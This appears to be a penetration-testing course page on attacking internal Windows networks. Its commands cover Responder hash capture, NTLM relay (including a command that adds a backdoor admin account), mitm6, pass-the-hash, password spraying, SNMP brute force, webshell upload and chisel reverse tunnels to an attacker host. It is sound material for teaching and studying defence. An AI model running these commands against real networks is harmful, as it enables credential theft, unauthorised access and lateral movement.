# Infrastructure Pentesting

!!! info "Why This Matters"
    Internal infrastructure assessments are where the most damaging real-world attacks happen. Ransomware groups don't exploit zero-days — they abuse Responder, credential reuse, unpatched systems, and weak AD configurations. Understanding this attack chain is what the IPT module of VAPT is about.

---

## Internal Network Reconnaissance

Starting position: you have network access (simulating a compromised workstation or contractor access).

### Initial Host Discovery

```bash
# ARP scan — fastest, most reliable on local LAN
arp-scan -l                              # Local network
arp-scan 192.168.1.0/24

# Nmap ping sweep
nmap -sn 192.168.0.0/16 -oA hosts       # /16 for larger internal ranges
nmap -sn 10.0.0.0/8 --min-rate 5000    # /8 for large class A (slow even with min-rate)

# Masscan — very fast, useful for large networks
masscan 10.0.0.0/8 -p80,443,445,3389,22 --rate=10000

# Responder passive mode — listen for NBT-NS/LLMNR broadcasts without poisoning
responder -I eth0 -A              # -A = analyze mode (no poisoning)
# Reveals hostnames, IPs, and authentication attempts organically
```

### Network Topology Mapping

```bash
# Traceroute to understand routing
traceroute 10.10.10.1
tracepath 10.10.10.1

# Identify routers and gateways
ip route                          # Linux routing table
route print                       # Windows routing table
arp -a                            # ARP cache — recently contacted hosts

# Find domain controllers (critical targets)
nmap -p 88,389,636,3268,3269 192.168.1.0/24  # Kerberos, LDAP, Global Catalog
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local  # DNS SRV record for DCs
nmap --script=dns-srv-enum --script-args="dns-srv-enum.domain='corp.local'"

# Identify key infrastructure
# Port 88  = Kerberos → Domain Controller
# Port 389 = LDAP → Domain Controller or LDAP server
# Port 445 = SMB → File servers, DCs, workstations
# Port 1433 = MSSQL → Database server
# Port 3389 = RDP → Remote access
# Port 8080/8443 = Web applications
```

### SMB Signing Check

SMB signing prevents relay attacks. Before running Responder, check if SMB signing is enforced:

```bash
# Nmap
nmap -p 445 --script smb-security-mode 192.168.1.0/24

# CrackMapExec (shows signing status for all hosts)
cme smb 192.168.1.0/24 | grep -v "SMB signing: True"
# Hosts where signing = False are relay targets

# runfinger.py (impacket)
python3 /usr/share/doc/python3-impacket/examples/runfinger.py -i 192.168.1.0/24
```

---

## Credential Capture — Responder

Responder poisons LLMNR, NBT-NS, and mDNS — Windows protocols that fall back to broadcast when DNS fails. When a Windows host tries to resolve a hostname it can't find in DNS, it broadcasts a request. Responder answers "that's me!" and captures the authentication attempt.

### LLMNR/NBT-NS Poisoning

```
Windows host tries: \\fileserver\share
DNS lookup for "fileserver" fails
→ LLMNR broadcast: "Who has fileserver?"
Responder: "I do! Connect to me."
Windows host tries to authenticate: sends NTLMv2 hash
Responder captures the hash
```

```bash
# Basic Responder (captures hashes)
responder -I eth0

# Responder captures NTLMv2 hashes to:
# /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
# (one file per source IP)

# Hash format (NTLMv2):
# username::domain:challenge:NTProofStr:blob
# CORP\john::CORP:1122334455667788:abc123...:0101...

# Crack with hashcat
hashcat -m 5600 ntlmv2_hashes.txt /wordlists/rockyou.txt
hashcat -m 5600 ntlmv2_hashes.txt /wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### What Responder Poisons

Responder responds to multiple protocols simultaneously:

- **LLMNR** (UDP/5355) — Link-Local Multicast Name Resolution

- **NBT-NS** (UDP/137) — NetBIOS Name Service  
- **mDNS** (UDP/5353) — Multicast DNS

- **MDNS** (TCP/5353)

Responder also serves fake servers:

- **SMB server** — captures NTLM authentication

- **HTTP server** — captures NTLM via browser authentication

- **HTTPS server** — with self-signed cert

- **FTP server** — captures cleartext FTP credentials

- **SMTP/IMAP/POP3** — captures email credentials

- **DNS** — resolves all to attacker

- **DHCP** — rogue DHCP (with -d flag)

### Responder Configuration

```bash
# /etc/responder/Responder.conf
# Enable/disable specific servers
# Disable SMB and HTTP if you want relay instead of capture:

# For relay (ntlmrelayx): disable SMB and HTTP in Responder
# so the auth is forwarded to relay tool instead of captured

# Common scenario: poison with Responder, relay with ntlmrelayx
# Edit Responder.conf:
SMB = Off     # Don't respond to SMB (let ntlmrelayx handle it)
HTTP = Off    # Don't respond to HTTP

responder -I eth0 -rdwv    # -r = NBNS reg answers, -d = DHCP, -w = wpad proxy
```

---

## NTLM Relay Attacks

Capturing NTLMv2 hashes requires cracking. Relay attacks use the hash *directly* — without cracking — to authenticate to another system. Much faster and works even against strong passwords.

### ntlmrelayx

```bash
# Run ntlmrelayx to relay captured authentications to targets
# Target list: hosts where SMB signing is disabled

# Build targets list
cme smb 192.168.1.0/24 --gen-relay-list targets.txt

# Start relay
ntlmrelayx.py -tf targets.txt -smb2support
# When a user authenticates to your Responder:
# → credentials relayed to all targets in list
# → if user is local admin on target: you get SAM dump and/or shell

# Relay with command execution
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# Relay to LDAP (for AD modification instead of SMB shell)
ntlmrelayx.py -tf ldap://dc.corp.local -smb2support --no-smb-server \
  --delegate-access --escalate-user lowprivuser

# Interactive shell on relay
ntlmrelayx.py -tf targets.txt -smb2support -i
# Then: nc 127.0.0.1 11000 (connects to interactive SMB shell)
```

### WebDAV Relay (From HTTP Auth)

```bash
# Trigger HTTP auth (not SMB) — works even when SMB signing is enforced
# Find a machine running WebClient service (webclient service = HTTP-based relay possible)
cme smb 192.168.1.0/24 -M webdav     # Check for WebDAV client

# Coerce auth via various methods to HTTP instead of SMB:
# WebDAV coercion using searchConnector-ms or .library-ms files
# Place file on network share the target accesses

# Relay HTTP auth to LDAP (LDAP doesn't have signing by default)
ntlmrelayx.py -t ldaps://dc.corp.local --no-smb-server --http-port 80 \
  --escalate-user lowprivuser --add-computer attacker$ Password123
```

### MITM6 + ntlmrelayx (IPv6 DNS Takeover)

```bash
# Most Windows networks have IPv6 enabled but no IPv6 DNS server
# mitm6 becomes the IPv6 DNS server via DHCPv6 and redirects all DNS queries

# Terminal 1: Run mitm6
mitm6 -d corp.local

# Terminal 2: Relay to LDAP/S on DC
ntlmrelayx.py -6 -wh wpad.corp.local -t ldaps://dc.corp.local \
  -smb2support --delegate-access

# Windows machines request DHCPv6 → mitm6 responds → becomes their DNS
# Windows then requests WPAD config from attacker → triggers authentication
# ntlmrelayx relays to LDAP → create computer account or add privileges
```

---

## Pass-the-Hash (PtH)

After extracting NTLM hashes from SAM or LSASS, use them directly for lateral movement without cracking.

```bash
# CrackMapExec — PtH across the network
cme smb 192.168.1.0/24 -u administrator -H <NTLM_hash> --local-auth
# Shows which hosts the admin hash works on

# Impacket suite — PtH authentication
# psexec
psexec.py -hashes :NThash CORP/administrator@192.168.1.100

# smbexec
smbexec.py -hashes :NThash CORP/administrator@192.168.1.100

# wmiexec (more stealth — uses WMI, no service creation)
wmiexec.py -hashes :NThash CORP/administrator@192.168.1.100

# secretsdump (dump hashes from remote machine)
secretsdump.py -hashes :NThash CORP/administrator@192.168.1.100

# Evil-WinRM (PowerShell Remoting with PtH)
evil-winrm -i 192.168.1.100 -u administrator -H NThash
```

---

## Pivoting — Network Segmentation Traversal

Once you have a foothold in one network segment, pivoting extends your reach to other segments through the compromised host.

### SSH Tunneling

```bash
# Local port forward: access internal service through SSH
# "Forward local port 8080 to internal-server:80 through jump-host"
ssh -L 8080:internal-server.corp:80 user@jump-host.corp
# Now: curl http://localhost:8080 reaches internal-server:80

# Remote port forward: expose your listener through SSH to target network
ssh -R 4444:localhost:4444 user@target.corp
# On target network: connections to target.corp:4444 reach your nc listener

# Dynamic (SOCKS proxy): route all traffic through SSH
ssh -D 9050 user@jump-host.corp
# Configure proxychains to use socks5://127.0.0.1:9050
# Now: proxychains nmap -sT 10.10.10.0/24
# All Nmap traffic routed through jump-host
```

### Proxychains Configuration

```bash
# /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 9050    # After SSH -D 9050

# Use with tools:
proxychains nmap -sT -p 445,3389,22 10.10.10.0/24
proxychains cme smb 10.10.10.100 -u admin -p 'Password123'
proxychains evil-winrm -i 10.10.10.100 -u admin -p 'Password123'
proxychains msfconsole    # Route all MSF connections through pivot
```

### Chisel (HTTP Tunneling)

When SSH is not available, Chisel creates tunnels over HTTP/WebSockets:

```bash
# Attacker: run chisel server
chisel server --reverse --port 8080

# Victim: connect back and open SOCKS proxy
chisel.exe client attacker_ip:8080 R:socks

# Now proxychains uses socks5://127.0.0.1:1080 (default chisel reverse SOCKS port)
# Configure proxychains.conf → socks5 127.0.0.1 1080
proxychains cme smb internal-network-target
```

### Metasploit Pivoting

```bash
# After getting a Meterpreter session on pivot host:
meterpreter> run post/multi/manage/autoroute
# Or manually:
msf> route add 10.10.10.0/24 [session_id]

# All MSF modules now route through the pivot session
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 10.10.10.0/24
msf> run

# SOCKS proxy through Meterpreter
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run
# Configure proxychains → socks5 127.0.0.1 1080
```

### Socat Relay

```bash
# Forward port on pivot host to internal target
# On pivot host:
socat TCP-LISTEN:8888,fork TCP:internal-server:80
# Connect to pivot:8888 → reaches internal-server:80

# As background process
socat TCP-LISTEN:8888,fork,reuseaddr TCP:10.10.10.5:80 &
```

---

## Key Internal Pentest Findings Summary

| Finding | Tool | Impact |
|---------|------|--------|
| LLMNR/NBT-NS poisoning | Responder | Credential capture |
| SMB relay (signing disabled) | ntlmrelayx | Code execution / lateral movement |
| Weak SMB credentials | CrackMapExec + hydra | Lateral movement |
| Pass-the-Hash | impacket, CrackMapExec | Lateral movement |
| SMB anonymous/null session | smbclient, enum4linux | Info disclosure |
| SNMP default community | snmp-check, onesixtyone | Device info disclosure |
| Default credentials on services | hydra, cme | Access to services |
| Unpatched systems (EternalBlue) | nmap smb-vuln scripts | RCE |
| Cleartext protocols (Telnet, FTP) | Wireshark, Responder | Credential capture |
| Local admin reuse | CrackMapExec | Widespread PtH |

---

## SNMP Exploitation — In Depth

SNMP (Simple Network Management Protocol) is consistently underestimated in internal assessments. v1 and v2c use cleartext community strings for authentication. Default strings "public" (read) and "private" (read-write) are often unchanged.

### What SNMP Reveals

```bash
# Full MIB walk — everything the device exposes
snmpwalk -v2c -c public target 2>/dev/null

# System information (OS, hostname, uptime, contact, location)
snmpwalk -v2c -c public target 1.3.6.1.2.1.1
snmpget -v2c -c public target 1.3.6.1.2.1.1.1.0    # sysDescr — OS version
snmpget -v2c -c public target 1.3.6.1.2.1.1.5.0    # sysName — hostname

# Network interfaces and IPs
snmpwalk -v2c -c public target 1.3.6.1.2.1.2        # Interface table
snmpwalk -v2c -c public target 1.3.6.1.2.1.4.20     # IP address table
# This reveals ALL IP addresses configured on the device — critical for finding hidden interfaces

# Routing table
snmpwalk -v2c -c public target 1.3.6.1.2.1.4.21     # IP route table
# Reveals network topology — which subnets are reachable from this device

# Running processes (on Windows SNMP agents)
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2   # hrSWRunTable
# Lists all running processes — reveals software installed and running

# Installed software
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3   # hrSWInstalledTable

# Windows user accounts (with Windows SNMP subagent)
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25

# Open TCP connections
snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13     # tcpConnTable

# Network traffic statistics (useful for topology mapping)
snmpwalk -v2c -c public target 1.3.6.1.2.1.2.2.1
```

### Community String Brute Force

```bash
# onesixtyone — fast SNMP community string brute force
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt target
onesixtyone -c community_strings.txt -i target_list.txt

# Nmap NSE scripts
nmap -sU -p 161 --script snmp-brute target
nmap -sU -p 161 --script snmp-brute \
  --script-args snmp-brute.communitiesdb=/wordlists/snmp.txt target

# If write community found:
# snmpset — modify device configuration
# (requires explicit client authorization — document intent before executing)
snmpset -v2c -c private target OID type value
```

### SNMP Findings in Reports

A device with the "public" community string exposed is typically a **High** finding:

- Reveals network topology, IP addresses, routing tables

- Reveals software inventory (patch management intelligence)

- Reveals system configuration details useful for targeted exploitation

- Write community string = potential configuration modification

---

## Internal Network Credential Attacks

### Password Spraying — Full Methodology

Password spraying against Windows networks requires understanding the lockout policy first.

```bash
# Step 1: Determine password policy
# Via SMB (no credentials required on many networks)
enum4linux-ng -P dc.corp.local
cme smb dc.corp.local --pass-pol

# Via LDAP (requires credentials)
ldapsearch -x -H ldap://dc.corp.local -b "DC=corp,DC=local" \
  "(objectClass=domainPolicy)" | grep -i "lockout"

# Via Kerberos (no credentials, no lockout from observation)
# AS-REQ with wrong password generates event 4771, not 4625
# Not a reliable policy discovery method

# Policy values to note:
# Lockout threshold: e.g., 5 attempts
# Observation window: e.g., 30 minutes (reset counter after this)
# Lockout duration: e.g., 30 minutes
```

```bash
# Step 2: Build target user list
# From SNMP (if available)
snmpwalk -v2c -c public dc.corp.local 1.3.6.1.4.1.77.1.2.25 | \
  grep -oP '(?<=STRING: ).*' > users.txt

# From SMB null session
enum4linux-ng -U dc.corp.local 2>/dev/null | grep "username:" | \
  awk '{print $2}' > users.txt

# From Kerberos enumeration (no credentials, check for valid usernames)
kerbrute userenum -d corp.local \
  /usr/share/seclists/Usernames/Names/names.txt \
  --dc dc.corp.local -o valid_users.txt

# From LDAP (with credentials)
ldapsearch -x -H ldap://dc.corp.local \
  -D "user@corp.local" -w "password" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName | \
  grep sAMAccountName | awk '{print $2}' > users.txt
```

```bash
# Step 3: Spray — one password per user, stay under lockout threshold
# Rule: attempt count must stay below lockout threshold across ALL users
# If threshold is 5: maximum 4 attempts per user total, spread over observation windows

# Spray 1 — common passwords (one attempt per user)
cme smb dc.corp.local -u users.txt -p 'Summer2024!' --continue-on-success
# Wait full observation window before next spray

# Spray 2 — second password attempt (after observation window resets)
cme smb dc.corp.local -u users.txt -p 'Password123!' --continue-on-success

# Via Kerberos (preferred — generates different event IDs, less visible)
kerbrute passwordspray -d corp.local users.txt 'Summer2024!' \
  --dc dc.corp.local -o spray_results.txt

# Good password candidates for spraying:
# Season+Year+!: Summer2024!, Winter2024!, Spring2024!
# Company+Year: Company2024, Company@2024
# Common: Password1, Welcome1, P@ssw0rd
# Month+Year: January2024, Jan2024!
```

### Credential Reuse Testing

```bash
# Once credentials are found, immediately test lateral movement reach
cme smb 192.168.1.0/24 -u found_user -p 'FoundPassword' --continue-on-success

# Test all protocols
cme winrm 192.168.1.0/24 -u found_user -p 'FoundPassword'
cme mssql 192.168.1.0/24 -u found_user -p 'FoundPassword'

# Check local admin hash reuse (after first machine is compromised)
# Dump local admin hashes
secretsdump.py corp.local/found_user:FoundPassword@compromised_host | grep "Administrator"

# Test local admin hash across all hosts
cme smb 192.168.1.0/24 -u "Administrator" -H :LocalAdminNTHash --local-auth \
  --continue-on-success
```

---

## FTP and Legacy Service Exploitation

### FTP Detailed Testing

```bash
# Anonymous login check
ftp target
> anonymous
> (any email as password)
> ls -la
> get sensitive_file.txt

# Nmap scripts for FTP
nmap --script "ftp-*" -p 21 target
nmap --script ftp-anon -p 21 target          # Anonymous check
nmap --script ftp-bounce -p 21 target         # FTP bounce attack
nmap --script ftp-proftpd-backdoor -p 21 target  # ProFTPD backdoor (CVE-2010-4221)
nmap --script ftp-vsftpd-backdoor -p 21 target   # vsftpd 2.3.4 backdoor

# Active vs Passive mode matters for scanning through NAT/firewalls
ftp> passive    # Toggle passive mode
ftp> active     # Toggle active mode

# FTP writable directories (if write access exists)
ftp> put webshell.php    # Upload to web root if FTP serves web directory
ftp> ls
```

### Telnet and Cleartext Protocol Capture

```bash
# If Telnet is found (port 23) — capture credentials with Responder or Wireshark
# Wireshark filter: telnet
# Follow TCP stream to see all cleartext commands

# Similarly for other cleartext protocols:
# FTP credentials: ftp.request.command == "PASS"
# HTTP Basic Auth: http.authorization
# POP3 credentials: pop.request.command == "PASS"
# IMAP: imap contains "login"
```

---

## Internal Web Applications and Admin Panels

Internal networks often host web applications never hardened for security — they assume internal access means authorized access.

```bash
# Discover internal web servers
nmap -p 80,443,8080,8443,8888,9090,9443,3000,5000 192.168.1.0/24
# Also check non-standard ports from full scan results

# Common internal applications to look for:
# :8080 → Tomcat manager, Jenkins, JBoss
# :9090 → Prometheus, CockroachDB admin
# :9200 → Elasticsearch (often unauthenticated)
# :8888 → Jupyter Notebook (often unauthenticated!)
# :5601 → Kibana (sometimes unauthenticated)
# :3000 → Grafana (default admin:admin)
# :6379 → Redis CLI accessible via nc
# :27017 → MongoDB (often unauthenticated in older installations)
# :5432 → PostgreSQL (check for pg_hba.conf trust authentication)
# :1433 → MSSQL (check for SA with blank password, xp_cmdshell)
# :8089 → Splunk management
# :4848 → GlassFish admin
# :4040 → Spark UI (job status, sometimes code execution)

# Test each discovered app for:
# Default credentials (admin/admin, admin/password, admin/blank)
# Unauthenticated access
# Version disclosure → CVE search
# Direct command execution interfaces (Jupyter, Splunk, etc.)
```

---

## Evidence Collection During Internal Assessments

During an internal engagement, document everything in real time — don't rely on memory for reports.

```bash
# Screenshot tool — take screenshots with timestamps
import-module /path/to/screenshot.ps1  # PowerShell
scrot -d 0 "screenshot_%Y%m%d_%H%M%S.png"  # Linux

# Terminal session logging
script -a session_log.txt  # Linux — logs everything to file
# Stop with: exit

# Network connection logging
ss -tulpn | tee network_state_$(date +%Y%m%d_%H%M%S).txt

# For Metasploit: spool to log file
msfconsole
msf> spool /path/to/engagement_log.txt

# HTTP request/response saving (curl)
curl -v http://target.com 2>&1 | tee http_evidence.txt

# Always save:
# - Command output showing vulnerability exists
# - HTTP request that demonstrates the issue
# - Response showing impact (data extracted, access gained)
# - System information showing which host you're on (whoami, hostname, ipconfig/ifconfig)
```
